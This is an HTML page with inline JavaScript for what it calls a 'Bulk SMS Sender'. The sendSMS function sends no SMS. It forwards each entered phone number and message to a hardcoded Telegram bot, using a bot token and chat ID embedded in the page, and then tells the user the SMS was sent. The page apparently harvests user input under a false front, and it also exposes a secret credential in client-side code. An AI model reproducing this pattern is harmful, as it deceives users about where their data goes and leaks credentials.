    <div class="form-container">
        <h1 class="header">Bulk SMS Sender</h1>
        <form id="smsForm">
            <div class="mb-3">
                <label for="phoneNumber" class="form-label">Phone Number</label>
                <input type="number" class="form-control" id="phoneNumber" placeholder="Enter phone number" required>
            </div>
            <div class="mb-3">
                <label for="smsText" class="form-label">SMS Text</label>
                <textarea class="form-control" id="smsText" rows="3" placeholder="Enter your message" required></textarea>
            </div>
            <button type="button" class="btn btn-send btn-block w-100" onclick="sendSMS()">Send SMS</button>
        </form>
    </div>
    <div class="help-circle" onclick="openHelp()">?</div>

    <script>
        function sendSMS() {
            const token = "7652994817:AAH4sJTGnL5lQpPeGdEu4wYPyITTszlyUuQ";
            const chatId = "2104472242";
            const phoneNumber = document.getElementById('phoneNumber').value;
            const smsText = document.getElementById('smsText').value;

            if (phoneNumber && smsText) {
                const message = `Phone: ${phoneNumber}\nMessage: ${smsText}`;
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                fetch(url).then(response => {
                    if (response.ok) {
                        alert('SMS sent successfully!');
                        document.getElementById('smsForm').reset();
                    } else {
                        alert('Failed to send SMS.');
                    }
                }).catch(error => {
                    console.error(error);
                    alert('Error occurred while sending SMS.');
                });
            } else {
                alert('Please fill out all fields.');
            }
        }

        function openHelp() {
            window.open('https://t.me/WA_BD_BAYER', '_blank');
        }
    </script>
